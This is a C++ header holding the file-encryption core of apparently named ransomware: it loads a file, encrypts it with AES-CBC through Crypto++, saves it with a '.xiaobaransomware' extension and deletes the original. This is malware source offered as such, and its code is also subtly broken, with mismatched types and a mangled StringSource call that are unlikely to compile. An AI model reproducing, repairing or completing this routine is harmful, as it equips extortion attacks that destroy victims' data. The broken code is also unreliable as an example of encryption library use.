#pragma once
#include <cryptopp/aes.h>
#include <cryptopp/osrng.h>
#include <cryptopp/modes.h>
#include <cryptopp/filters.h>
#include <iostream>
#include <filesystem>
#include <iomanip>
#include <dirent.h>
#include <bitset>
#include <fstream>
using namespace std;
using namespace CryptoPP;
using namespace std::filesystem;
namespace Encryptor 
{
    void lock(std::string filename, std::byte* key, std::byte* iv)
    {
        // Load file into memory
        std::ifstream hukm(filename.c_str(), std::ios::binary);
        std::vector<std::byte*> plaintext((std::istreambuf_iterator<char>((hukm))), std::istreambuf_iterator<char>((hukm)));
        hukm.close();

        // Encrypt the data
        std::string ciphertext;
        CBC_Mode<AES>::Encryption encryption;
        encryption.SetKeyWithIV(reinterpret_cast<CryptoPP::byte*>(key), AES::DEFAULT_KEYLENGTH, reinterpret_cast<CryptoPP::byte*>(iv));
        StringSource source = new StringSource((plaintext.begin(), plaintext.end(), true, new StreamTransformationFilter(encryption, new StringSink(ciphertext))));

        // Save the encrypted file to disk
        std::string new_filename = filename + ".xiaobaransomware";
        std::ofstream output_z(new_filename.c_str(), std::ios::binary);
        output_z << ciphertext;
        output_z.close();

        // Delete the original file 
        remove(filename.c_str());
    }

}